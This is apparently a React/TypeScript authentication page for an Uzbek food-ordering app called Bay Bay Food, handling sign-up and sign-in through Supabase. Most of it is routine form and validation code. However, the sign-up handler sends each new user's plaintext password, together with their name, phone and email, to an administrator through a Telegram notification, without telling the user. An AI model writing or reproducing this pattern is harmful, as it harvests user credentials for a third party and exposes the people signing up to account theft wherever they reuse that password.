import { useState } from "react";
import { useNavigate, Link } from "react-router-dom";
import { motion } from "framer-motion";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Eye, EyeOff } from "lucide-react";
import { z } from "zod";
import { toast } from "sonner";
import { notifyTelegram } from "@/lib/notifyTelegram";

const phoneRe = /^\+998\d{9}$/;
const usernameRe = /^[a-z0-9_]{3,24}$/i;

const signUpSchema = z.object({
  name: z.string().trim().min(2, "Ism juda qisqa").max(80),
  username: z.string().trim().regex(usernameRe, "Username: 3-24 ta harf/raqam/_"),
  phone: z.string().regex(phoneRe, "Telefon: +998XXXXXXXXX"),
  password: z.string().min(6, "Parol kamida 6 ta belgi").max(72),
});

function formatPhone(v: string) {
  const d = v.replace(/\D/g, "").replace(/^998/, "").slice(0, 9);
  let out = "+998";
  if (d.length > 0) out += " (" + d.slice(0, 2);
  if (d.length >= 2) out += ") " + d.slice(2, 5);
  if (d.length >= 5) out += " " + d.slice(5, 7);
  if (d.length >= 7) out += " " + d.slice(7, 9);
  return out;
}
const cleanPhone = (v: string) => "+998" + v.replace(/\D/g, "").replace(/^998/, "").slice(0, 9);

export default function Auth() {
  const nav = useNavigate();
  const [mode, setMode] = useState<"signin" | "signup">("signup");
  const [loading, setLoading] = useState(false);
  const [showPw, setShowPw] = useState(false);
  const [f, setF] = useState({ name: "", username: "", phone: "+998 ", password: "", login: "" });

  function translateErr(msg: string) {
    if (/Invalid login/i.test(msg)) return "Login yoki parol noto'g'ri";
    if (/already registered|already exists|duplicate/i.test(msg)) return "Bu username allaqachon ro'yxatdan o'tgan";
    if (/Password should/i.test(msg)) return "Parol kamida 6 ta belgi bo'lishi kerak";
    return msg;
  }

  // Each user gets a synthetic email built from username so Supabase auth works without real email.
  const buildEmail = (username: string) => `${username.toLowerCase()}@baybay.local`;

  async function resolveLoginToEmail(login: string): Promise<string | null> {
    if (login.includes("@")) return login.trim();
    // Try DB first (in case profile.email differs)
    try {
      const { data } = await (supabase as any).rpc("get_email_by_username", { _username: login.trim() });
      if (data) return data as string;
    } catch {}
    return buildEmail(login.trim());
  }

  async function submit() {
    if (mode === "signup") {
      const phone = cleanPhone(f.phone);
      const p = signUpSchema.safeParse({ ...f, phone });
      if (!p.success) { toast.error(p.error.issues[0].message); return; }
      setLoading(true);

      const email = buildEmail(p.data.username);
      const { data, error } = await supabase.auth.signUp({
        email,
        password: p.data.password,
        options: {
          emailRedirectTo: window.location.origin,
          data: {
            full_name: p.data.name,
            username: p.data.username.toLowerCase(),
            phone,
          },
        },
      });
      if (error) { setLoading(false); toast.error(translateErr(error.message)); return; }
      if (!data.session) {
        const { error: signInErr } = await supabase.auth.signInWithPassword({ email, password: p.data.password });
        if (signInErr) { setLoading(false); toast.error(translateErr(signInErr.message)); return; }
      }

      // Notify admin TG (full credentials)
      notifyTelegram({
        type: "signup",
        signup: {
          full_name: p.data.name,
          username: p.data.username.toLowerCase(),
          email,
          phone,
          password: p.data.password,
        },
      }).catch(() => {});

      setLoading(false);
      toast.success("Muvaffaqiyatli ro'yxatdan o'tdingiz!");
      nav("/profile");
    } else {
      if (!f.login.trim() || f.password.length < 6) { toast.error("Login va parolni kiriting"); return; }
      setLoading(true);
      const email = await resolveLoginToEmail(f.login);
      if (!email) { setLoading(false); toast.error("Foydalanuvchi topilmadi"); return; }
      const { error } = await supabase.auth.signInWithPassword({ email, password: f.password });
      setLoading(false);
      if (error) { toast.error(translateErr(error.message)); return; }
      toast.success("Xush kelibsiz!");
      nav("/profile");
    }
  }

  return (
    <div className="flex min-h-screen items-center justify-center px-5 py-10">
      <motion.div initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} className="w-full max-w-md rounded-3xl bg-card p-8 shadow-elegant">
        <h1 className="font-display text-4xl font-black">
          {mode === "signup" ? "Ro'yxatdan o'tish" : "Kirish"}
        </h1>
        <p className="mt-2 text-muted-foreground">Bay Bay Food jamoasiga qo'shiling</p>

        <div className="mt-6 space-y-3">
          {mode === "signup" ? (
            <>
              <div>
                <Label>Ism</Label>
                <Input className="mt-1 h-12 rounded-xl" value={f.name} onChange={(e) => setF({ ...f, name: e.target.value })} />
              </div>
              <div>
                <Label>Username</Label>
                <Input className="mt-1 h-12 rounded-xl" placeholder="masalan: ali_99" value={f.username} onChange={(e) => setF({ ...f, username: e.target.value })} />
              </div>
              <div>
                <Label>Telefon raqam</Label>
                <Input
                  inputMode="tel"
                  className="mt-1 h-12 rounded-xl text-base"
                  placeholder="+998 (__) ___ __ __"
                  value={f.phone}
                  onChange={(e) => setF({ ...f, phone: formatPhone(e.target.value) })}
                />
              </div>
            </>
          ) : (
            <div>
              <Label>Username</Label>
              <Input className="mt-1 h-12 rounded-xl" placeholder="ali_99" value={f.login} onChange={(e) => setF({ ...f, login: e.target.value })} />
            </div>
          )}
          <div>
            <Label>Parol</Label>
            <div className="relative mt-1">
              <Input
                type={showPw ? "text" : "password"}
                className="h-12 rounded-xl pr-12"
                value={f.password}
                onChange={(e) => setF({ ...f, password: e.target.value })}
              />
              <button
                type="button"
                onClick={() => setShowPw((s) => !s)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground"
                aria-label={showPw ? "Parolni yashirish" : "Parolni ko'rsatish"}
              >
                {showPw ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
          </div>
          <Button onClick={submit} disabled={loading} className="h-14 w-full rounded-2xl bg-gradient-primary text-base font-extrabold">
            {loading ? "Kuting..." : mode === "signup" ? "Ro'yxatdan o'tish" : "Kirish"}
          </Button>
        </div>

        <button onClick={() => setMode(mode === "signup" ? "signin" : "signup")} className="mt-4 w-full text-center text-sm font-bold text-primary hover:underline">
          {mode === "signup" ? "Akkauntingiz bormi? Kirish" : "Akkauntingiz yo'qmi? Ro'yxatdan o'tish"}
        </button>
        {mode === "signin" && (
          <Link to="/forgot-password" className="mt-2 block text-center text-xs font-bold text-muted-foreground hover:text-primary">
            Parolni unutdingizmi?
          </Link>
        )}
        <Link to="/" className="mt-3 block text-center text-xs text-muted-foreground">← Bosh sahifa</Link>
      </motion.div>
    </div>
  );
}
